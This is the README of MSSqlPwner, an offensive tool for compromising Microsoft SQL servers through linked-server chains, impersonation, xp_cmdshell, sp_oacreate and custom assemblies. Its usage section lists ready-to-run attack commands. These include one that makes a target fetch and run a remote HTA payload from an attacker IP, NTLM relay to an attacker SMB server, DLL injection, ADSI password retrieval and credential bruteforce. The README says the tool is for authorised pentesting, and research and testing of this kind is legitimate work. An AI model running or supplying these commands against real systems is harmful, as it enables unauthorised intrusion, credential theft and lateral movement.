# MSSqlPwner
<p align="center">
 <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/logo.PNG?raw=true">
</p>
MSSqlPwner is an advanced and versatile pentesting tool designed to seamlessly interact and pwn MSSQL servers.
That tool is based on impacket, which allows attackers to authenticate to databases using clear-text passwords NTLM Hashes,  and kerberos tickets.
With MSSqlPwner, users can execute custom commands through various methods, including custom assembly, `xp_cmdshell`, and `sp_oacreate(Ole Automation Procedures)` and much more. 

The tool starts with recursive enumeration on linked servers and possible impersonations in order to gather all the possible chains for command execution.

Also, the MSSqlPwner tool can be used for NTLM relay capabilities, utilizing functions such as `xp_dirtree`, `xp_subdirs`, `xp_fileexist`.

This tool can be used for lateral movement assessments and exploration of linked servers.

If the authenticated MSSQL user does not have permission to execute certain operations, the tool can find the right chain that will allows command execution. 
For example, if your user cant execute commands in the current context, the tool will build a chain that will use a link server and connect back to our server with escelated privileges.

## Example

### Command execution
<p align="center">
 <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/poc.png?raw=true">
</p>

### Bruteforce
<p align="center">
 <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/brute.png?raw=true">
</p>

This tool is supported by multiple authentication methods and described below.

## Disclaimer
This tool is designed for security professionals and researchers for testing purposes only and should not be used for illegal purposes.

## Functionalities:
1. Utilities:
- `interactive`: allow to use the tool interactively with live execution.
- `enumerate`: enumerate the linked servers and the chains.
- `` get the list of the chains:
  - Optional arguments:
    - `` - Get filtered results with specific hostname.
- `get-link-server-list` get the list of the linked servers.
- `set-chain` Set chain ID (For interactive-mode only!)
  - Required arguments:
    - `CHAIN` - The chain ID to set.
- `set-link-server` Set link server (For interactive-mode only!)
  - Required arguments:
    - `LINK` - The link server to set.
- `get-rev2self-queries` retrieve queries to revert to SELF (For interactive-mode only!).
- `get-adsi-provider-list` retrieve ADSI provider list.
- `rev2self` revert to SELF (For interactive-mode only!).

2. Command Execution: Execute commands using the following functions:
- `exec` Execute commands using `exec` on local server or on linked servers
  - Required arguments:
    - `COMMAND` - The command to execute.
  - Optional arguments:
    - `-command_execution_method` - The command execution method to use.
      - Supported methods:
        - `xp_cmdshell` - Execute commands using `xp_cmdshell` procedure (Default).
        - `sp_oacreate` - Execute commands using `Ole Automation Procedure` procedure (Should be used like "cmd /c something").

3. Password Retrieval:
- `retrieve-password` Password retrieval from ADSI providers.
  - Optional arguments:
    - `-listen-port` - The port to listen on (Default: 1389).
    - `-adsi-provider` - ADSI Provider to use (if not defined, it will choose automatically).
    - `-arch` - The architecture to use (if not defined, it will choose automatically).
      - Supported architectures:
        - `x86` - Use x86 architecture.
        - `x64` - Use x64 architecture.

4. NTLM Hash Stealing and Relay: Issue NTLM relay or steal NTLM hashes using the following functions:
- `ntlm-relay` - Force NTLM relay to a server.
  - Required arguments:
      - `SMB_SERVER` - The SMB server to relay to.
  - Optional arguments:
    - `-relay-method` - The relay method to use.
      - Supported methods:
        - `xp_dirtree` - Use `xp_dirtree` procedure (Default).
        - `xp_subdirs` - Use `xp_subdirs` procedure.
        - `xp_fileexist` - Use `xp_fileexist` procedure (In some situations this module should be executed from privileged chain).

5. Procedure execution using custom assembly:
- `custom-asm` - Execute procedures using custom assembly
  - Required arguments:
      - `COMMAND` - The command/path or query to use.
  - Optional arguments:
    - `-procedure-name` - The procedure name to use (Default: `execute_command`).
      - Supported procedures:
      - `execute_command` - Execute commands using custom assembly (Default).
      - `run_query` - Execute queries using custom assembly.
      - `run_query_system_service` - Execute queries using custom assembly as system user (Like SqlSVC).
- 
- `inject-custom-asm` Inject code using custom assembly.
  - Required arguments:
      - `file_location` - The file location to inject.
  - Optional arguments:
  - `-procedure-name` - The procedure name to use (Default: `Inject`).
  
6. Direct Queries 
- `direct-query` Execute direct queries
- Required arguments:
    - `QUERY` - The query to execute.
- Optional arguments:
- `-query-method` - The query method to use.
  - Supported methods:
    - `OpenQuery` - Use `OpenQuery` procedure (Default).
    - `exec_at` - Use `exec AT` procedure.
7. Bruteforce
- `brute` Launch bruteforce (Can receives tickets, hashes and passwords)
- Required arguments:
    - `TARGETS_FILE` - a file contains hosts and ips to brute.
    - `-ul` - a file contains users to brute.
- Optional arguments:
  - `-pl` - a file contains passwords to brute.
  - `-tl` - a file contains tickets to brute.
  - `-hl` - a file contains hashes to brute.
- Notes:
- If you want to use tickets, you should use Service Principal Name (SPN) format (Like MSSQLSvc/hostname.domain.com:1433).
- If you use tickets, you not required to set passwords or hashes.
- If you DONT use tickets, you should provide at least password file or hash file.
  
## General optional arguments (Should be BEFORE the chosen function):
- `-link-name` - The link server name to use
- `-chain-id` - The chain ID to use
- `-max-link-depth` - The maximum link depth to use (Default: 10)
- `-max-impersonation-depth` - The maximum impersonation depth to use (Default: 10)
- `-auto-yes` - Automatically answer yes to all questions (Default: False)
- `-timeout` - The timeout to use (Default: 30)


## Lateral Movement and Chain Exploration:
MSSqlPwner provides opportunities for lateral movement assessments and exploration of linked servers. 
In scenarios where the current session lacks administrative privileges, the tool attempts to find a chain that escalates its own privileges via linked servers. 
If a session on a linked server has higher privileges, the tool can interact with the linked server and perform a linked query back to the host with elevated privileges, enabling lateral movement with the target server.

## Authentication Methods:
Supported by multiple authentication methods, including:
- Windows credentials
- MSSQL credentials
- Kerberos authentication
- Kerberos tickets
- NTLM Hashes

The tool adapts to various scenarios and environments, verifying the effectiveness of authentication mechanisms.

Take your MSSQL environment assessments to the next level with the power and versatility of MSSqlPwner. 
Discover new possibilities for lateral movement, stealthy querying, and precise security evaluations with this the MSSqlPwner tool.

## Installation
```
git clone https://github.com/ScorpionesLabs/MSSqlPwner
cd MSSqlPwner
pip3 install -r requirements.txt
python3 MSSqlPwner.py
```


## Usage
```

# Interactive mode
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive


# Executing custom assembly on the current server with windows authentication and executing hostname command 
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
python3 MSSqlPwner.py hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
python3 MSSqlPwner.py hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
python3 MSSqlPwner.py hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
python3 MSSqlPwner.py hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
python3 MSSqlPwner.py hosts.txt brute -ul users.txt -hl hashes.txt

```


## Thanks
- [Kim Dvash](https://www.linkedin.com/in/kim-d-5b3114111) for designing this incredible logo.
- [Pablo Martínez](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/) for the inspiration and the idea of the retrieving password technique.
- [Omri Baso](https://www.linkedin.com/in/omri-baso-875aaa191/) for helping with inspiration and ideas.